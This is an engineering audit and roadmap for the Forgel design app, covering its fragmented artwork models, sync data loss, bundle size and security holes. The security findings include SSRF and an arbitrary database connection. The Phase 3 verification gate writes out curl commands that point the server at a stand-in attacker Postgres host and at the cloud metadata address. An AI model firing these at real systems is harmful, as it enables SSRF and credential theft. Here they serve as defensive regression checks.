---
title: "Forgel: Deep Audit & Mobile-First Design Tool Roadmap"
date: 2026-08-05
author: "Ibrahim"
featureId: "arch-0001"
status: "Planned"
schemaVersion: 3
relatedPR: ""
---

# Forgel: Deep Audit & Mobile-First Design Tool Roadmap

## Summary

Evidence-based audit of the Forgel codebase (22,920 LOC / 36 commits) and a phased,
verifiable plan to turn it into a mobile-first design tool that can credibly compete with
Figma, Canva, Illustrator and Affinity.

---

# PART 1 — AUDIT FINDINGS

All findings below were verified by reading code, running the typechecker, the test suite,
and a production build. Commands used are recorded so each can be re-checked.

## 1.1 What genuinely works (do not rebuild these)

| Area | Evidence |
|---|---|
| Typecheck is clean | `npx tsc --noEmit` → **0 errors** |
| Build succeeds | `npx vite build` → built in 11.03s |
| Tests pass | `npx vitest run` → **7 files / 23 tests passed** |
| Secret hygiene | `.gitignore` excludes `.env*`, only `.env.example` committed |
| Firestore rules | Default-deny; project ownership enforced; role escalation gated on `request.auth.token.email` (server-verified) |
| Real feature breadth | AI (Gemini + multi-model registry), PDF/PPTX/PNG/ZIP export, Figma export, Google Drive, i18n, templates, web workers |

This is a real codebase, not a mockup. The problems below are architectural, not cosmetic.

## 1.2 CRITICAL — Three incompatible artwork models

The single most important finding. The app stores the *same artwork* three different ways,
each with **its own separate undo stack**:

| # | Representation | Defined | Edited by | History lives in |
|---|---|---|---|---|
| 1 | `sceneGraph: Node[]` | `src/types.ts` | `CanvasRenderer.tsx` (read-only, 45 lines) | `store.ts` `sceneHistory` |
| 2 | `svgSource: string` | `store.ts:116` | `SVGPathEditor.tsx` (3,301 LOC) | local `useState` |
| 3 | `whiteboardSketches[]` | `store.ts:133` | `WhiteboardCanvas.tsx` (3,184 LOC) | local `sketchesHistory` |

Consequences:
- Undo in one editor cannot undo work done in another.
- Artwork does not round-trip between editors without loss.
- Every new feature must be built three times.

A fourth, entirely dead model exists in `src/schema.ts` (`LayerSpec` / `VectorNode`).
Verified dead: `grep -rn "from './schema'" src/` returns **no importers**.

## 1.3 CRITICAL — The scene graph cannot represent a design

`src/types.ts` `Node` has **no `children` and no `parentId` field**, yet declares
`type: "group"`. Groups are therefore unimplementable — the scene graph is structurally flat.

`CanvasRenderer.tsx` is 45 lines and its switch ends in `default: return null`, so
**`text`, `image` and `group` nodes render as nothing**. Gradients are dropped too: fill is
only applied when `typeof style?.fill === 'string'`, but `Fill` is defined as a union that
includes gradient objects.

## 1.4 CRITICAL — SVG is edited with regular expressions

`SVGPathEditor.tsx` parses and rewrites SVG via regex, e.g.:

```
src/components/SVGPathEditor.tsx:274   const regex = /<path([^>]+)\/?>/g;
src/components/SVGPathEditor.tsx:416   const newSvg = actualSvgSource.replace(regex, (match) => {
```

This only ever matches `<path>` elements. `<rect>`, `<circle>`, `<text>`, `<g>`, nested
transforms, namespaces, comments and CDATA are invisible to the editor. This is the core
"precision engine" of a tool intended to rival Illustrator.

## 1.5 CRITICAL — Cloud sync silently destroys user assets

`prepareForFirestore()` (`store.ts:271-438`) exists because the whole project is written as a
**single Firestore document**, capped at ~1 MB. It applies **nine progressive degradation
steps**, which in order: prune undo history to 5 → 2 → 1 entries, drop `logoHistory`, drop
`snapshots`, then **replace base64 mockups, sonic assets and refinement files with the literal
placeholder string** `[Large mockup asset omitted for Cloud Sync...]`, and finally replace
`logoUrl` with a stub SVG.

`restoreOmittedFields()` repairs this *only from the same device's local cache*. Open the
project on a second device and the assets are permanently gone. This is data loss, not
throttling.

## 1.6 HIGH — Persistence cost is O(entire workspace) per edit

`updateProject()` ends with `await set('projects', updatedProjects)` — every single edit
rewrites **all projects** to IndexedDB, including every base64 asset in every project.
Undo/redo route through `updateProject`, so undo is a full workspace rewrite plus a network
write. History entries are full snapshots (`sceneHistory: { nodes: Node[] }[]`), so memory
grows O(nodes × steps).

`WhiteboardCanvas.updateSketchesWithHistory` additionally runs
`JSON.stringify(updated) === JSON.stringify(sketches)` as a dedup check on every mutation.

## 1.7 HIGH — "Collaboration" is last-write-wins, not co-editing

`server.ts` (~line 530): on a `sync` message the server does
`room.projectState = { ...projectState, comments: mergedComments }` — the entire project state
is overwritten by whichever client sent last. Only comments are merged (by id).

Also: rooms are in-memory only (no persistence, single instance, no horizontal scale);
auth is a **single shared static token** and is **skipped entirely when `WS_AUTH_TOKEN` is
unset**; `userId = msg.userId || Math.random()...` is client-supplied and spoofable.

`docs/yjs-mapping.md` and `src/schema.ts` document a Yjs CRDT design in detail — but
`yjs` is **not a dependency** (0 matches in `package.json` and `bun.lock`). The design was
written and never built.

## 1.8 HIGH — Security issues

1. **Arbitrary database connection.** `/api/backup/postgres` is unauthenticated and does
   `const connectionString = customConnectionString || process.env.DATABASE_URL;`
   then `new Pool({ connectionString })` (`src/server/backupRouter.ts:53-64`). Any anonymous
   caller makes the server open a Postgres connection to a host of their choosing. Same
   pattern for Supabase url/key at lines 154-167, 256-269, 288-301.
2. **SSRF via model endpoint.** `endpoint = req.headers['x-stepfun-endpoint']` →
   `fetch(endpoint, ...)` with no allowlist (`src/server/geminiRouter.ts:194-206, 259-284`).
   Reaches cloud metadata endpoints and internal services.
3. **API keys readable by any signed-in user.** `updateSettings()` writes the full `settings`
   object — containing `geminiKey`, `openaiKey`, `stepfunKey`, `poolsideKey`, `tencentKey`,
   `postgresConnectionString`, `supabaseAnonKey`, `figmaToken` — into `users/{uid}`. But
   `firestore.rules` allows `get: if isSignedIn() && isValidId(userId)` and
   `list: if isSignedIn()` on `/users`, with **no owner check**. Any authenticated user can
   enumerate every user document and read their credentials.
4. **Unauthenticated 50 MB bodies.** `express.json({ limit: "50mb" })` with no auth and no
   rate limiter on `/api/backup` (only `/api/gemini` is limited).
5. **Latent key inlining.** `vite.config.ts:30` defines `process.env.GEMINI_API_KEY` into the
   *client* bundle. Currently only referenced server-side, so it does not leak today — but any
   client-side reference to that name would ship the key to every browser.

## 1.9 HIGH — Bundle size makes mobile-first impossible today

Measured from `npx vite build`:

```
dist/assets/index-47SSrWkb.js   2,067.00 kB │ gzip: 568.77 kB   ← single chunk
dist/assets/index-C4Ht42He.css    124.45 kB │ gzip:  18.27 kB
PWA precache: 9 entries (2,239.22 KiB)
```

There are exactly **3 dynamic imports in the entire `src/` tree**, all of them `jszip`.
Firebase *and* Supabase SDKs both ship to every client even though a user configures only one.
`recharts`, `motion` and i18n all load on first paint. Nothing is route- or feature-split.

## 1.10 MEDIUM — Test coverage and component health

- 541 LOC of tests against 22,920 LOC of source; test execution time is 255 ms.
- **The two editors (6,485 LOC combined) have zero tests** —
  `grep -rln "SVGPathEditor\|WhiteboardCanvas\|CanvasRenderer" src/tests e2e-tests` → no matches.
- `SVGPathEditor.tsx`: 47 `useState`, **0** `useMemo`/`useCallback`/`memo`.
- `WhiteboardCanvas.tsx`: 29 `useState`, **0** memoization. `onTouchMove={handleMouseMove}`.
- `App.tsx`: 95 `useState` in one 2,994-line component.
- No ESLint config; `"lint"` is only `tsc --noEmit`.

## 1.11 MEDIUM — Repository hygiene

- **98 leftover agent scripts** at repo root (`fix_*.cjs`, `fix_*.py`, `patch_*.cjs`, `*.patch`).
- `README.md` is inaccurate: claims "React 18+" (it is React 19) and "Custom store
  implementation with local storage persistence" (it is Zustand + IndexedDB + Firestore).
- `FORGEL_UNDERSTANDING.md` is a single empty heading.

---

# PART 2 — THE ROADMAP

Ordering principle: **nothing in Phases 2-6 is safe to build until Phase 1 lands**, because
every feature would otherwise have to be implemented three times, once per artwork model.

Each phase states its exit criteria as a **gate** — an objective, runnable check.

## Phase 0 — Safety net and baseline (1 week) — COMPLETE

You cannot refactor safely with the editors untested. Build the net first.

### Status: complete as of 2026-08-06

**Headline measurement**: first contentful paint is **14,996 ms** on a throttled Pixel 7
(Slow 4G, 4x CPU). Fifteen seconds to first paint, from the single 569 kB gzip chunk. This is
the number Phase 4 exists to fix, and it is now recorded rather than assumed.

**Done**
- ESLint added (`eslint.config.js`) with a defect-focused ruleset; `lint` now actually lints
  and `typecheck` is a separate script. Errors went **217 → 12**.
- Vitest coverage wired with thresholds pinned to the measured baseline.
- Extracted the regex SVG pipeline out of `SVGPathEditor.tsx` into
  **`src/engine/legacySvgPath.ts`** — a pure, dependency-free module. Behaviour-preserving;
  verified by typecheck, the full suite, and a component-level test asserting the UI displays
  exactly what the module parses.
- **Characterization tests: 23 → 79 tests.** `src/engine/legacySvgPath.ts` is at 100% line and
  function coverage. Every known bug from section 1.4 is now pinned with a `KNOWN BUG` label.
- Data-loss characterization for `prepareForFirestore` — the asset-destruction ladder from
  section 1.5 is pinned so Phase 2 can be verified.
- Deleted **99 orphaned root scripts**; removed **505 lines of dead `{false && ...}` JSX**
  from `App.tsx` (2,994 → 2,489 LOC) plus two dead `if (false)` blocks in `SVGPathEditor`.
- Extracted the whiteboard geometry into **`src/engine/legacyWhiteboardGeometry.ts`** and
  characterized it. `src/engine` is now at **100% line and function coverage**.
- **Playwright** configured mobile-first (Pixel 7 primary, desktop parity) with 5 smoke flows
  passing on both viewports, including a horizontal-overflow guard.
- **Performance baseline** captured via `scripts/perfBaseline.mjs` under Slow 4G + 4x CPU.
- `plans/baseline.json` records measured build, test, coverage, lint, e2e, perf and LOC numbers.
- README corrected (it claimed React 18 and a "custom store with local storage").
- Tests: **23 → 111**. Lint errors: **217 → 12**.

**New defects found while characterizing** (all pinned by tests, all Phase 1 targets):
- `translatePath` offsets SVG **arc flags** as if they were coordinates, so moving any circle
  emits invalid flags (`1,0` becomes `6,5`) and corrupts the shape.
- Path hit-testing counts arc radii and flags as x/y coordinates, producing a bounding box
  that can be wildly wrong — a click far outside a circle registers as a hit.
- `translatePath` silently ignores space-separated coordinates (`M 10 20`), so those paths
  never move at all.
- A shape with a `type` but no `props` converts to an empty path and is silently lost.

**Still outstanding** — needs tooling or hardware unavailable here:
- Lighthouse score (the CLI is not installed; FCP was measured directly instead).
- ms-per-drag-frame on a 500-node document, on a real mid-range Android.
- The two pre-existing specs in `e2e-tests/` target selectors that do not exist and are
  excluded via `testMatch` until repaired.

**Work**
1. Add ESLint + a `lint` script that actually lints; keep `tsc --noEmit` as `typecheck`.
2. Add Vitest coverage reporting (`vitest run --coverage`).
3. Write characterization tests that pin **current** editor behaviour (not ideal behaviour):
   draw a path, move a node, undo, redo, export SVG — assert exact output strings.
4. Add Playwright smoke flows for the three editors on a mobile viewport.
5. Record a performance baseline (see gate).
6. Delete the 98 root scripts; fix `README.md`; delete dead `src/schema.ts` or wire it up.

**Verification gate**
```bash
npm run lint                       # exits 0
npx tsc --noEmit                   # exits 0
npx vitest run --coverage          # editors > 40% line coverage
npx playwright test                # all smoke flows green at 390x844
npx vite build                     # record baseline bundle bytes to plans/baseline.json
ls *.cjs *.py 2>/dev/null | wc -l  # → 0
```
Baseline metrics to capture in `plans/baseline.json`: bundle gzip bytes, cold TTI on a
throttled 4G Lighthouse run, ms-per-drag-frame on a 500-node document.

## Phase 1 — One document model (3-5 weeks) — THE CRITICAL PATH

Collapse three artwork models into one. This is the highest-leverage work in the entire plan.

**Work**
1. Extend `Node` in `src/types.ts` with `children?: Node[]` (or `parentId` + `order`),
   `name`, `visible`, plus real `Fill`/`Stroke` handling including gradients.
2. Replace regex SVG handling with a real parser/serializer: `DOMParser` →
   `Node` tree → serializer. Write it as a pure module (`src/engine/svgIo.ts`) so it is
   unit-testable in isolation.
3. Make `Node[]` the **only** artwork state. `svgSource` becomes an import/export format,
   never the live model. `whiteboardSketches` migrates into `Node[]`.
4. Rewrite `CanvasRenderer` to handle every node type including `group`, `text`, `image`
   and gradients — one renderer used by all editing surfaces.
5. Move history into a single command-based undo stack (`Command` in `types.ts` already
   sketches this) — store **deltas, not full snapshots**.
6. Write a one-time migration for existing stored projects, with a dry-run mode.

**Verification gate**
- **Round-trip property test**: for a corpus of ≥50 SVGs (include nested `<g>`, transforms,
  `<text>`, gradients, `<rect>`, `<circle>`), assert `parse → serialize → parse` is stable
  and visually identical. This is the single most important test in the codebase.
- Undo made in the whiteboard is undoable from the path editor (explicit integration test).
- `grep -rn "whiteboardSketches" src/` → 0 hits outside the migration module.
- `grep -c "useState" src/components/SVGPathEditor.tsx` → materially reduced.
- Migration test: load a pre-migration fixture project, assert zero artwork loss.
- Golden-image test: render the corpus before/after, diff with a pixel threshold < 0.1%.

## Phase 2 — Fix persistence and stop the data loss (2-3 weeks)

**Work**
1. Split storage: project *metadata* in one document; artwork in its own record; **binary
   assets (mockups, sonic, refinement files, logos) into object storage** (Supabase Storage
   or Firebase Storage), referenced by URL.
2. Delete the nine degradation steps in `prepareForFirestore` — once assets are external, the
   1 MB ceiling stops being reachable and nothing needs to be destroyed.
3. Make `updateProject` write **only the changed project**, not the whole array.
4. Pick **one** primary database. Keep Firestore *or* Supabase; move the other behind an
   explicit export feature. Remove `pg` from the client-facing path entirely.
5. Persist history separately from the project document, capped and compacted.

**Verification gate**
- Create a project with 3 × 5 MB assets, sync, load it **on a second browser profile**, assert
  every asset is byte-identical. (Today this test fails — that is the point.)
- `grep -n "omitted for Cloud Sync" src/` → 0 hits.
- Instrument IndexedDB write bytes per single edit: must be O(one project), not O(workspace).
  Assert a fixed upper bound in a test.
- Load test: 100 projects × 200 nodes; edit latency stays under budget.

## Phase 3 — Security hardening (1 week, can run parallel to Phase 2)

**Work**
1. Require authentication on **all** `/api/backup/*` routes; verify a Firebase ID token
   server-side.
2. **Remove** `customConnectionString` / `customUrl` / `customKey` from the request body
   entirely. Server-side credentials only.
3. Allowlist model endpoints; reject any `x-*-endpoint` header not on the list.
4. Fix `firestore.rules`: `/users/{userId}` `get` and `list` must require
   `userId == request.auth.uid`.
5. Move API keys out of the user document into a separate collection that is never listable,
   or hold them server-side per user.
6. Lower the 50 MB body limit; add rate limiting to every route, not just `/api/gemini`.
7. Remove the `process.env.GEMINI_API_KEY` define from `vite.config.ts`.

**Verification gate**
```bash
# each of these must FAIL (non-2xx) after the fix:
curl -X POST $APP/api/backup/postgres -d '{"customConnectionString":"postgres://attacker/x"}'
curl -X POST $APP/api/gemini/... -H 'x-stepfun-endpoint: http://169.254.169.254/'
```
- Firestore rules unit tests (`@firebase/rules-unit-testing`): user A reading user B's doc
  must be denied — assert it.
- `grep -rn "GEMINI_API_KEY" dist/assets/*.js` → 0 hits.
- Run `npm audit` and a secret scan in CI.

## Phase 4 — Mobile-first interaction (3-4 weeks)

Only now is mobile work worth doing, because it lands once instead of three times.

**Work**
1. **Code-split aggressively.** Route-level splitting plus lazy-load AI, export (jspdf,
   pptxgenjs, html2canvas), charts, Drive/Figma integrations, and the non-active editor.
   Load only the configured database SDK.
2. Replace `onTouchMove={handleMouseMove}` with a real Pointer Events layer: pinch-zoom,
   two-finger pan, palm rejection, long-press context menus, `touch-action` set correctly.
3. Redesign for thumb reach: bottom sheet toolbars, not desktop side panels.
4. Add memoization to the editors; move hit-testing and path math into the existing workers.
5. Real offline-first PWA: full manifest (icons, `display: standalone`, `start_url`),
   Workbox runtime strategies, background sync queue for edits made offline.

**Verification gate**
- Lighthouse mobile: **Performance ≥ 90, PWA installable = pass**, on throttled 4G.
- Initial JS gzip **< 200 kB** (from 568 kB today); assert with a CI bundle-size budget that
  fails the build on regression.
- Sustained **60 fps** while dragging on a 500-node document, measured on a real mid-range
  Android device, not just desktop devtools.
- Playwright touch-gesture tests for pinch/pan/long-press on real device viewports.
- Airplane-mode test: edit offline, reconnect, assert edits sync with no loss.

## Phase 5 — The differentiator: AI as a native edit primitive (4-6 weeks)

Figma has almost no native AI; Canva's feels bolted on. This is where you win rather than
catch up — and it is only possible once Phase 1 gives AI a real scene graph to manipulate.

**Work**
1. Let the model emit `Command[]` (the type already exists) applied directly to the scene
   graph — so **every AI action is undoable** like any manual edit. This is the key insight.
2. Text-to-vector that produces editable node trees, not flat raster or opaque SVG blobs.
3. Selection-scoped operations: "make this rounder", "harmonize these colors".
4. Live brand-consistency checking against `BrandGuideSpec` as the user edits.
5. Server-side key custody, per-user quotas, streaming responses.

**Verification gate**
- Every AI mutation is a `Command`; undo after an AI action restores exact prior state —
  property-tested over generated command sequences.
- AI output always parses into a valid node tree; malformed output is rejected, never
  partially applied (fuzz the model output path).
- Golden tests over a fixed prompt set to catch regressions in generation quality.
- p95 latency budget enforced in CI.

## Phase 6 — Real-time collaboration (4-6 weeks)

**Work**
1. Install `yjs` and implement the mapping **already documented** in `docs/yjs-mapping.md`
   and `src/schema.ts` — the design work is done, only the build is missing.
2. Replace whole-state broadcast with CRDT deltas over the existing `/ws-collab` socket.
3. Per-room authorization with real tokens; server-side identity, not `msg.userId`.
4. Persist room state (Redis or Postgres) so it survives restarts and scales past one node.
5. Presence, comments and cursors ride on the CRDT awareness protocol.

**Verification gate**
- **Concurrent-edit convergence test**: two headless clients edit different nodes
  simultaneously; both converge to the identical document and neither loses an edit. Today's
  code fails this by construction.
- Partition test: disconnect a client, edit on both sides, reconnect, assert convergence.
- Spoofing test: a client claiming another's `userId` is rejected.
- Server restart mid-session preserves room state.
- Load: 10 concurrent editors per room, sync latency p95 < 200 ms.

## Phase 7 — Desktop parity and pro tooling (ongoing)

Boolean path operations, proper pen tool, alignment/distribution, smart guides, masks and
clipping, non-destructive effects, real typography (variable fonts, kerning, text-on-path),
color management (CMYK/spot for print), multi-artboard, component/symbol libraries,
plugin API, keyboard-driven workflows.

**Verification gate**: per-feature golden-image tests against reference renderings; export
fidelity tests opening Forgel SVG/PDF output in Illustrator/Inkscape and diffing.

---

## Sequencing summary

```
Phase 0  Safety net           1 wk    ── must be first
Phase 1  One document model   3-5 wk  ── THE critical path, blocks everything
Phase 2  Persistence          2-3 wk  ─┐ parallel
Phase 3  Security             1 wk    ─┘
Phase 4  Mobile-first         3-4 wk  ── needs 1 + 2
Phase 5  AI primitive         4-6 wk  ── needs 1; the differentiator
Phase 6  Collaboration        4-6 wk  ── needs 1 + 2
Phase 7  Desktop pro tools    ongoing
```

Roughly 4-6 months to a genuinely competitive mobile-first tool, with Phases 3 and 4
delivering user-visible wins early.

## Standing verification practice

Adopt these as CI gates so quality cannot silently regress:

| Gate | Threshold |
|---|---|
| `tsc --noEmit` | 0 errors |
| `eslint` | 0 errors |
| Unit + integration tests | pass; coverage never decreases |
| SVG round-trip property test | 100% stable over corpus |
| Bundle size budget | initial JS gzip < 200 kB |
| Lighthouse mobile | Performance ≥ 90, PWA pass |
| Firestore rules tests | cross-user access denied |
| Playwright mobile flows | green on 390x844 |

## Risks

- **Phase 1 is a genuine rewrite of the editors.** Characterization tests from Phase 0 are
  what make it survivable — do not skip Phase 0.
- **Migration risk**: existing projects use three models. Ship a dry-run migration and a
  backup export before any destructive change.
- **Scope**: Phase 7 is effectively unbounded. Treat Phases 1-6 as the product; Phase 7 is
  continuous.
